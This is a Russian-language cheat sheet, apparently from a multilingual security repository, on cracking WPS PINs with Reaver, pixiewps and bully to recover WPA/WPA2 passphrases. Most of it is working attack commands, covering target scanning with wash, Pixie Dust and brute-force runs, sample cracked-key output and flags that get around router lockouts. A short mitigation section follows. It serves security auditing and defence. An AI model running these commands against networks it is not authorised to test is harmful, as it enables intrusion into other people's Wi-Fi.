<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Шпаргалка по Риверу

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) — это специализированный инструмент аудита безопасности Wi-Fi, предназначенный для выполнения атак методом перебора на PIN-коды регистратора Wi-Fi Protected Setup (WPS). Восстановив 8-значный PIN-код WPS, Reaver получает открытый ключ WPA/WPA2 (PSK). Он также поддерживает автономные атаки Pixie Dust через `pixiewps`.

---

## Содержание

- [Механика уязвимостей WPS](#wps-vulnerability-mechanics)
- [Установка (`reaver` и `pixiewps`)](#installation-reaver--pixiewps)
- [Разведка: идентификация сетей WPS (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Атака Pixie Dust (Мгновенное восстановление ключа)](#pixie-dust-attack-instant-key-recovery)
- [Полный онлайн-перебор PIN-кода WPS](#full-online-wps-pin-brute-force)
- [Ограничение скорости доступа и обработка блокировки] (#ap-rate-limiting--lockout-handling)
- [Защитное смягчение](#defensive-mitigation)

---

## Механика уязвимостей WPS

Для аутентификации по PIN-коду WPS используется 8-значный PIN-код, разделенный на две половины:
- Первая половина состоит из 4 цифр ($10^4 = 10 000$ возможностей).
- Вторая половина состоит из 3 цифр + 1 цифра контрольной суммы ($10^3 = 1000$ возможностей).
- Вместо проверки комбинаций $10^8 = 100 000 000$ злоумышленник проверяет не более $10 000 + 1 000 = 11 000 $ попыток.
- **Атака Pixie Dust:** использует слабый PRNG (генераторы псевдослучайных чисел) в определенных наборах микросхем беспроводной связи (Ralink, MediaTek, Realtek, Broadcom) для вычисления PIN-кода WPS в автономном режиме за секунды всего из двух исходных пакетов.

---

## Установка (`reaver` и `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Разведка: идентификация сетей WPS (`wash`)

Перед запуском Reaver найдите точки доступа с включенным WPS и проверьте, заблокированы ли они:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Ключевые столбцы, на которые следует обратить внимание:
- **`WPS Locked`**: если `Yes`, маршрутизатор заблокировал попытки ввода PIN-кода WPS из-за предыдущих действий по подбору пароля. Целевые маршрутизаторы, показывающие `No`.
- **`WPS Ver`**: версия WPS (1.0 или 2.0).
- **`ESSID` и `BSSID`**: имя целевой сети и MAC.

---

## Pixie Dust Attack (мгновенное восстановление ключа)

Атака Pixie Dust (`-K 1`) — самая быстрая атака на WPS. Он собирает E-Hash1, E-Hash2 и одноразовые номера с маршрутизатора и взламывает PIN-код в автономном режиме, не вызывая ограничения скорости:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: интерфейс режима монитора.
- `-b <bssid>`: MAC целевого маршрутизатора.
- `-c 6`: канал целевой точки доступа.
- `-K 1`: Запустите автоматическую атаку Pixie Dust через `pixiewps`.
- `-vv`: подробный вывод.

*В случае уязвимости PIN-код и WPA PSK печатаются менее чем за 10 секунд.*

---

## Полный онлайн-перебор PIN-кода WPS

Если Pixie Dust потерпит неудачу, вернитесь к онлайн-перебору:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Как только PIN-код обнаружен, Reaver выводит:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## Ограничение скорости доступа и обработка блокировки точек доступа

Многие современные роутеры блокируют попытки WPS на 5-15 минут после 3-5 неудачных попыток. Используйте флаги задержки и повторной настройки:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Альтернатива: использование `bully`
`bully` — это быстрая реализация WPS-атаки на языке C, которая хорошо справляется с нестандартными реализациями маршрутизаторов:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Защитное смягчение

- **Полностью отключить WPS.** Самая безопасная рекомендация — отключить WPS в веб-интерфейсе маршрутизатора.
- **Обновление прошивки.** Современные маршрутизаторы реализуют строгое ограничение скорости, экспоненциальную задержку и исправляют недостатки энтропии PRNG, используемые Pixie Dust.
- **Используйте WPA3:** WPA3 полностью удаляет устаревший протокол WPS на основе PIN-кода, заменяя его безопасным Wi-Fi Easy Connect (DPP).